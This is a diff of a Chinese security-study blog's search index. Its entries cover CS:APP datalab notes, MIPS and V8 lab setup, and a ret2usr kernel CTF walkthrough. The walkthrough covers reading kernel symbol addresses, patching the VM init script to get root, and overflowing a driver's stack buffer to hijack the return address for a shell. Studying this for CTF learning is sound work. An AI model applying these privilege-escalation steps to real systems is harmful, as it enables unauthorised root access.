@@ -92,216 +92,6 @@
       </tags>
   </entry>
   <entry>
-    <title>datalab</title>
-    <url>/2020/07/23/datalab/</url>
-    <content><![CDATA[<h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1.bitXor"></a>1.bitXor</h4><p>用～（取补）和&amp;实现异或操作</p>
-<p><img src="/2020/07/23/datalab/image-20200720182358141.png" alt="image-20200720182358141"></p>
-<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h4><p>两字节补码的最小数</p>
-<p>0111 1111 1111 1111 1111 1111 1111 1111 最大的，～x + 1，取负，负数比正数小一个</p>
-<p>1000 0000 0000 0000 0000 0000 0000 0000 == 0x80000000 </p>
-<p>太大了，用移位</p>
-<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3.isTmax"></a>3.isTmax</h4><p>如果x是最大值，返回1，否则返回0</p>
-<ul>
-<li>最大值，符号位是0，其他是1，所以+1后，符号位是1，其他是0，相异或，全1,全1的反是0，0取非是1（判断是否是-1的方法）</li>
-<li>除了最大值，-1也有同样的情况</li>
-</ul>
-<p>排除：+1后，最大值是变成另一个数，而-1是0，根据这个排除掉-1</p>
-<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4.allOddBits"></a>4.allOddBits</h4><p>如果奇数位都是1，返回1，否则，返回0</p>
-<p>让x与0xAAAAAAAA相与，如果奇数位都是1，结果是0xAAAAAAAA，再异或就是0了，否则就非0</p>
-<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5.negate"></a>5.negate</h4><p>实现取反</p>
-<p>-x = ~x + 1</p>
-<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6.isAsciiDigit"></a>6.isAsciiDigit</h4><p>如果 0x30 &lt;= x &lt;= 0x39 ，返回1，否则，返回0</p>
-<p>将x与两数相减（x - y ==  x + （～y + 1） ），判断符号位（通过右移），第一个为正，第二个为负</p>
-<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7.conditional"></a>7.conditional</h4><p>有三个参数，x、y、z，如果x非0，返回y，否则，返回z</p>
-<p>判断x是否非零：!!x</p>
-<p>返回一个数：变成1，然后～x + 1变成-1（全1），然后相与</p>
-<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8.isLessOrEqual"></a>8.isLessOrEqual</h4><p>三种情况</p>
-<ul>
-<li>符号相反，如果y为正数，为1</li>
-<li>符号相同，相减 &gt; 0为1</li>
-<li>两数相等（异或实现），返回1</li>
-</ul>
-<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9.logicalNeg"></a>9.logicalNeg</h4><p>实现取非运算，零返回1，其他返回0</p>
-<p>正负零的符号位都是0</p>
-<p>取反与1&amp;，正负再&amp;</p>
-<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10.howManyBits"></a>10.howManyBits</h4><p>求共有多少位，最高位+1</p>
-<p>特殊情况</p>
-<ul>
-<li>0 : 1</li>
-<li>1 : 1</li>
-</ul>
-<p>正数：最高位1的位置 + 1（符号位）</p>
-<p>负数：求反码，同正数</p>
-<p>具体采用二分，32分成16，看高位16是否为0，非0，说明至少有16 + 1（前面的数）+ 1 （符号位），接着再8、4、2、1下去</p>
-<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11.floatScale2"></a>11.floatScale2</h4><p>实现乘2功能。（内部使用的单精度浮点型）</p>
-<p>特殊情况</p>
-<ul>
-<li>NaN：直接将参数返回回去</li>
-<li>区别规格化数和非规格化数</li>
-</ul>
-<p>单精度浮点内部</p>
-<p><img src="/2020/07/23/datalab/image-20200720214424119.png" alt="image-20200720214424119"></p>
-<p>NaN</p>
-<p><img src="/2020/07/23/datalab/image-20200720214532080.png" alt="image-20200720214532080"></p>
-<p>正负无穷</p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C11.png" alt="11"></p>
-<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12.floatFloat2Int"></a>12.floatFloat2Int</h4><p>参数的类型是unsigned，是浮点数的机器数，将其转换为该浮点数转换的int值。</p>
-<p>情况：</p>
-<ul>
-<li><p>指数部分为为负，说明一定是零点几，直接返0</p>
-</li>
-<li><p>如果大于31，大了，直接返回0x80000000u</p>
-</li>
-<li><p>在里面，先让尾数部分加上默认的1，然后看指数是否能把所有的尾数变整</p>
-<ul>
-<li>E &lt; 23，说明后面还有小数部分</li>
-<li>E &gt; 23，说明尾数都完整整数，还可以继续乘2^(E-23)</li>
-</ul>
-<p>最后，根据符号位，返回对应符号的frac</p>
-</li>
-</ul>
-<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13.floatPower2"></a>13.floatPower2</h4><p>2^x（x是参数），求该值float的机器数</p>
-<p>分别判断0和无穷大的情况，然后将阶码左移23位即可。</p>
-<p>23是因为，阶码部分，就是尾数（23位）前面，有个默认的1</p>
-<p>E = x;</p>
-<p>0 | bios + E | 23个0</p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.1.png" alt="13.1"></p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.2.png" alt="13.2"></p>
-<hr>
-<p><img src="/2020/07/23/datalab/image-20200720222037585.png" alt="image-20200720222037585"></p>
-]]></content>
-      <tags>
-        <tag>csapp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ret2usr</title>
-    <url>/2020/10/22/ret2usr/</url>
-    <content><![CDATA[<p>适合人群：内核基础为0</p>
-<h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p>基础知识：</p>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a></p>
-<p><a href="https://xz.aliyun.com/t/7625#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7625#toc-10</a></p>
-<h4 id="copy-from-user"><a href="#copy-from-user" class="headerlink" title="copy_from_user"></a>copy_from_user</h4><p>copy_from_user(void *to, const void __user *from, unsigned long n)</p>
-<p>（1）to：将数据拷贝到<strong>内核地址</strong> </p>
-<p>（2）from：需要拷贝数据的<strong>用户地址</strong></p>
-<p>（3）n：拷贝数据的长度（字节）</p>
-<blockquote>
-<p>也就是将form用户地址中的数据拷贝到to内核地址中去，拷贝长度是n</p>
-</blockquote>
-<h4 id="cpio解压和打包"><a href="#cpio解压和打包" class="headerlink" title="cpio解压和打包"></a>cpio解压和打包</h4><p>解压：cpio -idvm &lt; ../initramfs.cpio<br>打包：find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>调试，<code>startvm.sh</code>末尾加上</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>
-
-<p>【注：上一行后面还要加上’ \ ‘，不然的话，远程调试可能端口没开，连不上】</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903111140398.png" alt="image-20200903111140398"></p>
-<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h4 id="ret2usr（level1）"><a href="#ret2usr（level1）" class="headerlink" title="ret2usr（level1）"></a>ret2usr（level1）</h4><p>说明：参考<code>Linux Kernel Pwn 初探</code>,主要加上具体的一些细节</p>
-<h5 id="查找prepare-kernel-cred和commit-creds的地址"><a href="#查找prepare-kernel-cred和commit-creds的地址" class="headerlink" title="查找prepare_kernel_cred和commit_creds的地址"></a>查找prepare_kernel_cred和commit_creds的地址</h5><pre><code>$ grep prepare_kernel_cred  /proc/kallsyms 
-$ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2usr/image-20200903105056015.png" alt="image-20200903105056015"></p>
-<p>但是直接执行，地址都是0x0，需要root权限。</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903105223481.png" alt="image-20200903105223481"></p>
-<p>方法：修改suid</p>
-<p>（1）创建一个文件夹</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir myimage</span><br><span class="line">$ cd myimage</span><br></pre></td></tr></table></figure>
-
-<p>（2）解压initramfs.cpio文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cpio -idvm &lt; ..&#x2F;initramfs.cpio</span><br></pre></td></tr></table></figure>
-
-<p>（3）修改suid</p>
-<p>进入etc/init.d/rcS，将1000修改为0</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ gedit etc&#x2F;init.d&#x2F;rcS</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/ret2usr/image-20200903110009863.png" alt="image-20200903110009863"></p>
-<p>（4）重新打包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ find . | cpio -H newc -o &gt; ..&#x2F;initramfs.cpio</span><br><span class="line">level1&#x2F;myimage$ cd ..</span><br></pre></td></tr></table></figure>
-
-<p>（5）再次执行两条命令即可</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903110203208.png" alt="image-20200903110203208"></p>
-<p>已经是root权限了</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903110251793.png" alt="image-20200903110251793"></p>
-<p><code>prepare_kernel_cred</code>的地址为<code>0xffffffff810b9d80</code></p>
-<p><code>commit_creds</code>的地址为<code>0xffffffff810b99d0</code></p>
-<blockquote>
-<p>疑问解答：此时已经获得root权限了，不就可以直接cat /flag了？</p>
-<p>实际题目中，不会把真的flag放文件里给你，而是在远程环境了。但是本地的地址和远程的地址是一样的，所以，可以通过这种方法得到本地的用户权限，找到prepare_kernel_cred和commit_creds的地址，但是没有办法直接获得flag。</p>
-</blockquote>
-<h5 id="查找基地址"><a href="#查找基地址" class="headerlink" title="查找基地址"></a>查找基地址</h5><p>以root权限运行，参考上面（修改etc/init.d/rcS）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules </span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure>
-
-<h5 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h5><p>（1）编辑startvm.sh，端口可以修改</p>
-<p>0x7ffd958d7e08</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905004851358.png" alt="image-20200905004851358"></p>
-<p>（2）执行<code>./startvm.sh</code></p>
-<p>（3）打开新窗口，在<code>level1</code>目录下执行<code>gdb exp</code></p>
-<p>（4）远程连接，<code>target remote :1234</code></p>
-<p>（5）下断点（ida里面的地址+基地址），继续执行</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905103517562.png" alt="image-20200905103517562"></p>
-<p><img src="/2020/10/22/ret2usr/image-20200905103116021.png" alt="image-20200905103116021"></p>
-<p>（6）在原来的窗口，执行exp</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905103146690.png" alt="image-20200905103146690"></p>
-<p>（7）接着，就可以正常调试了</p>
-<h5 id="执行exp步骤"><a href="#执行exp步骤" class="headerlink" title="执行exp步骤"></a>执行exp步骤</h5><p>（1）编译exp.c</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc exp.c -o exp -w -static -fPIC</span><br></pre></td></tr></table></figure>
-
-<p>（2）将initramfs.cpio解压到myimage文件夹</p>
-<p>（3）将exp移入myimage文件夹下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp exp myimage&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>（4）重新打包，执行./startvm.sh</p>
-<p>exp已在/目录下了</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903111831663.png" alt="image-20200903111831663"></p>
-<h5 id="疑惑的0x88和0x80"><a href="#疑惑的0x88和0x80" class="headerlink" title="疑惑的0x88和0x80"></a>疑惑的0x88和0x80</h5><p>一开始，说将<code>0x100</code>的用户数据拷贝到内核栈上，高度只有<code>0x88</code>，后面又说实际上缓冲区距离<code>rbp</code>是<code>0x80</code>，有点迷。</p>
-<p>一开始的0x88，指的是初始化的时候。</p>
-<p>但是程序初始化的时候，有个压栈操作，所以少减了一个8</p>
-<p><img src="/2020/10/22/ret2usr/image-20200903112746033.png" alt="image-20200903112746033"></p>
-<h5 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h5><p>init_module是内核加载模块的时候调用的</p>
-<p>开始的时候（内核加载模块）：调用init_module</p>
-<p>中间的时候：</p>
-<p>我们调用ioctl调用了sub_0函数</p>
-<p>ioctl的参数就是sub_0的参数</p>
-<p><img src="/2020/10/22/ret2usr/image-20200905120014834.png" alt="image-20200905120014834"></p>
-<p><code>return (signed int)copy_from_user(&amp;v4, v2, 256LL);</code></p>
-<p>我们通过buf覆盖栈上的返回地址，执行v2中copy过去的templine函数，获得shell</p>
-<p>结束的时候：cleanup_module</p>
-]]></content>
-      <tags>
-        <tag>kernel pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>embedded(未完成)</title>
-    <url>/2020/10/22/embedded/</url>
-    <content><![CDATA[<h2 id="embedded"><a href="#embedded" class="headerlink" title="embedded"></a>embedded</h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>mips架构的题，ida没法反编译成伪代码，用反编译mips的工具<code>ghidra</code>，安装包在文件夹里。windows下运行<code>ghidraRun.bat</code>,linux下执行<code>ghidraRun</code>,emm,需要有jdk的环境。</p>
-<h3 id="传文件到qemu"><a href="#传文件到qemu" class="headerlink" title="传文件到qemu"></a>传文件到qemu</h3><p>将linux下的embedded_heap文件传入qemu：</p>
-<p>linux：sudo ifconfig tap0 12.0.0.2</p>
-<p>qemu：ifconfig eth0 12.0.0.1 </p>
-<p>遇到设备不存在，ifconfig，在开头看网卡名字</p>
-<p>ping通</p>
-<p>linux：python -m SimpleHTTPServer</p>
-<p>qemu：wget  12.0.0.2:8000/embedded_heap</p>
-<p><img src="/2020/10/22/embedded/image-20200831110650474.png" alt="image-20200831110650474"></p>
-<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>将两个so.0文件放到/lib文件下（注意：是根目录，，，）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mv libuClibc-0.9.33.2.so libc.so.0</span><br><span class="line">$ mv ld-uClibc-0.9.33.2.so ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/22/embedded/image-20200831191612015.png" alt="image-20200831191612015"></p>
-<p>qemu-mips  -L ./ ./embedded_heap</p>
-<p>也可以直接<code>./embedded_heap</code></p>
-<p>【可以使用的原因可能是因为binutils的存在用编译器自动转换了】</p>
-<p><strong>注意</strong></p>
-<p>还要修改lib文件下链接文件的权限</p>
-<p><img src="/2020/10/22/embedded/image-20200831191636914.png" alt="image-20200831191636914"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
-<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
-<hr>
-<h3 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h3><p><a href="https://baike.baidu.com/item/交叉编译/10916911" target="_blank" rel="noopener">交叉编译</a>（cross-compilation）是指，在某个主机平台上（比如PC上）用<a href="https://baike.baidu.com/item/交叉编译器/5125452" target="_blank" rel="noopener">交叉编译器</a>编译出可在其他平台上（比如ARM上）运行的代码的过程。</p>
-]]></content>
-      <categories>
-        <category>mips pwn</category>
-      </categories>
-      <tags>
-        <tag>iot</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bomblab</title>
     <url>/2020/07/24/bomblab/</url>
     <content><![CDATA[<p>总共六个阶段</p>
@@ -431,217 +221,128 @@ $ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/ret2us
       </tags>
   </entry>
   <entry>
-    <title>v8环境搭建</title>
-    <url>/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭个环境而已，花了我n久，哭泣。。。</p>
-<p>这里就讲下自己搭环境的经过，，，</p>
-<hr>
-<p>使用的环境：ubuntu 18.04</p>
-<h2 id="初次尝试：本地"><a href="#初次尝试：本地" class="headerlink" title="初次尝试：本地"></a>初次尝试：本地</h2><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p>主要参考的是这两篇博客：</p>
-<p><a href="https://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/05/06/v8/</a></p>
-<p><a href="https://bbs.pediy.com/thread-252812.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252812.htm</a></p>
-<hr>
-<h3 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h3><blockquote>
-<p>我的本地代理，开了没用，不知道为什么，本机可以上google，但是虚拟机里怎么都不可以，，，然后，，选择在虚拟机里面使用vpn</p>
-</blockquote>
-<p>这个是我用的：<a href="https://neworld.date/user（简单好用而且不贵）" target="_blank" rel="noopener">https://neworld.date/user（简单好用而且不贵）</a></p>
-<p>linux的教程：<a href="https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）" target="_blank" rel="noopener">https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）</a></p>
-<p>别的问题不大，注意的两点是：</p>
-<p>1.要使用的时候，需要在命令前面加上<code>proxychains4</code></p>
-<p>2.选择节点的时候，一定要选择有人的</p>
-<p>3.一定是root账户</p>
-<p>4.在/root目录下</p>
-<p>执行命令 <code>proxychains4 curl myip.ipip.net</code> 。如果显示empty server类似的</p>
-<p>那就重新来一遍（建议：wmware弄个快照，，每次都重新配，心真的很累），，，我当时玄学，学校里的网不行（貌似是因为校园网不能翻外网），连了自己的热点就可以了。</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure>
+    <title>embedded(未完成)</title>
+    <url>/2020/10/22/embedded/</url>
+    <content><![CDATA[<h2 id="embedded"><a href="#embedded" class="headerlink" title="embedded"></a>embedded</h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>mips架构的题，ida没法反编译成伪代码，用反编译mips的工具<code>ghidra</code>，安装包在文件夹里。windows下运行<code>ghidraRun.bat</code>,linux下执行<code>ghidraRun</code>,emm,需要有jdk的环境。</p>
+<h3 id="传文件到qemu"><a href="#传文件到qemu" class="headerlink" title="传文件到qemu"></a>传文件到qemu</h3><p>将linux下的embedded_heap文件传入qemu：</p>
+<p>linux：sudo ifconfig tap0 12.0.0.2</p>
+<p>qemu：ifconfig eth0 12.0.0.1 </p>
+<p>遇到设备不存在，ifconfig，在开头看网卡名字</p>
+<p>ping通</p>
+<p>linux：python -m SimpleHTTPServer</p>
+<p>qemu：wget  12.0.0.2:8000/embedded_heap</p>
+<p><img src="/2020/10/22/embedded/image-20200831110650474.png" alt="image-20200831110650474"></p>
+<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>将两个so.0文件放到/lib文件下（注意：是根目录，，，）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mv libuClibc-0.9.33.2.so libc.so.0</span><br><span class="line">$ mv ld-uClibc-0.9.33.2.so ld-uClibc.so.0</span><br></pre></td></tr></table></figure>
 
-<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="depot-tools"><a href="#depot-tools" class="headerlink" title="depot_tools"></a>depot_tools</h5><p>这个工具是用来得到v8源码的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
-
-<h5 id="ninja"><a href="#ninja" class="headerlink" title="ninja"></a>ninja</h5><p>这个工具是用来编译v8的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;github.com&#x2F;ninja-build&#x2F;ninja.git</span><br><span class="line">cd ninja &amp;&amp; .&#x2F;configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
-
-<p>echo两句命令，主要是写入环境变量，后期fetch v8的时候，可能会说找不到fetch命令，可能就是环境变量没了，可以通过vim ~/.bashrc，查看最后面是否有下面这两句话，没有的话，加上</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;</span><br><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;</span><br><span class="line">bash									&#x2F;&#x2F;载入环境变量</span><br></pre></td></tr></table></figure>
-
-<p>然后就是编译启动，我卡死在了v8，真的很慢，而且最后报错，，，出错，网上看了好多，也没解决，，，TAT</p>
-<p>后面的步骤</p>
-<h4 id="v8编译"><a href="#v8编译" class="headerlink" title="v8编译"></a>v8编译</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8&amp;&amp; gclient sync</span><br><span class="line">$ tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">$ ninja -C out.gn&#x2F;x64.debug</span><br></pre></td></tr></table></figure>
-
-<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;d8</span><br><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;shell</span><br></pre></td></tr></table></figure>
-
-<p>初始尝试失败，，搞了好久都没出来，，，，但是网上大部分都是这种方法</p>
-<hr>
-<h2 id="二次尝试"><a href="#二次尝试" class="headerlink" title="二次尝试"></a>二次尝试</h2><h3 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h3><p><a href="https://eternalsakura13.com/2018/06/26/v8_environment/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/06/26/v8_environment/</a></p>
-<h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><blockquote>
-<p>sakura为我们提供了第二种方法，我一开始试了下，但是谷歌云搞不来，没有信用卡啥的。但是后来只能尝试这个，所以找了下其他国外的云服务器。</p>
-<p>不需要代理啥的，真是舒服。</p>
-<p>知乎上的这篇给了较好的帮助：<a href="https://zhuanlan.zhihu.com/p/130402190" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/130402190</a></p>
-</blockquote>
-<p>我使用的是狗云，进来，“创建景点云服务器”，我一开始用的10G的硬盘，编译的时候发现太小了，然后只好销毁重来一个（这个只要三个工作日内，支持销毁退款）</p>
-<p>操作系统选择这个：CentOS 7 BBR，ubuntu 18我也用了，但还是出问题了</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010130803778.png" alt="image-20201010130803778"></p>
-<p>然后进入“我的经典云服务器”，启动，用xshell远程连过去</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010131058668.png" alt="image-20201010131058668"></p>
-<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">export PATH&#x3D;&#96;pwd&#96;&#x2F;depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">cd ~&#x2F;v8&#x2F;v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598(2019-starctf这道入门题)</span><br><span class="line">gclient sync</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.release(这个真的很慢，要耐心)</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.release # Release version</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.debug # Debug version</span><br></pre></td></tr></table></figure>
-
-<h5 id="release版本和debug版本"><a href="#release版本和debug版本" class="headerlink" title="release版本和debug版本"></a>release版本和debug版本</h5><p>上面的12-15行中，12-13两行下载的是release版本，14-15行下载的是debug版本。release版本可以正常运行，但是有些调试信息不能用，如job命令，执行起来的时候，也会告诉我们，没有调试的符号。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg: loaded 186 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print&#x2F;break)</span><br><span class="line">Reading symbols from .&#x2F;d8...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
-
-<p>debug就是调试版本，可以输入更多的调试信息。虽然debug看着好，但是，，，后面有点问题，，，两个都下过来就好。</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201015161210557.png" alt="image-20201015161210557"></p>
-<p>下过来之后，是这样的。</p>
-<p>我们进入x64.debug就可以调试状态下运行d8。。同理release</p>
-<h4 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">tar -czvf v8.tar v8</span><br><span class="line">sudo yum install vsftpd -y</span><br><span class="line">systemctl start vsftpd.service(在CentOS7和它之前，启动vsftpd服务的指令是 service vsftpd start，之后要使用新指令)</span><br><span class="line">sudo netstat -nltp | grep 21</span><br><span class="line">cp v8.tar &#x2F;var&#x2F;ftp&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>然后，浏览器就可以访问到了，点击下载即可。</p>
-<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201011095616016.png" alt="image-20201011095616016"></p>
-<p>哇哇哇哇，感天动地，终于搞定了。</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>实例程序(test.js)：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="v8的gdb"><a href="#v8的gdb" class="headerlink" title="v8的gdb"></a>v8的gdb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;tools</span><br><span class="line">mv gdbinit gdbinit_v8</span><br><span class="line">cp gdbinit_v8 ~&#x2F;.gdbinit_v8</span><br><span class="line">cd ~ </span><br><span class="line">vim .gdbinit</span><br><span class="line">#加入下面内容</span><br><span class="line">source ~&#x2F;.gdbinit_v8</span><br><span class="line">source ~&#x2F;v8&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support.py</span><br></pre></td></tr></table></figure>
-
-<p>命令：</p>
